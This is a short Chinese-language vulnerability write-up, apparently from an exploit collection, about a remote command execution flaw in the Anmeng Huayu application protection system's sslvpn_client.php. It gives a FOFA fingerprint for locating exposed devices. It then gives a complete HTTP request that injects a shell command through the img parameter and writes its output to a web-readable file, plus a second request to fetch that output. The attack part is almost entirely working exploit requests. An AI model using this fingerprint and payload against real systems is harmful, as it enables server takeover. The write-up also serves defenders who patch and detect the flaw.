# 安盟华御应用防护系统sslvpn_client存在远程命令执行漏洞

# 一、漏洞简介
安盟华御应用防护系统sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 安盟华御应用防护系统

# 三、资产测绘
+ fofa`body="./webui/js/jquerylib/" && icon_hash="-507802195"`
+ 特征![1701771919319-68c717ea-9581-4f52-a6b8-6fe95f714b73.png](./img/I4OS9Z4oQbmjVm3B/1701771919319-68c717ea-9581-4f52-a6b8-6fe95f714b73-598996.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e.png](./img/I4OS9Z4oQbmjVm3B/1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e-372549.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762342384-224cbced-19ed-428d-b26d-9957865251d2.png](./img/I4OS9Z4oQbmjVm3B/1701762342384-224cbced-19ed-428d-b26d-9957865251d2-769183.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cmv6rdoy8wqokzle>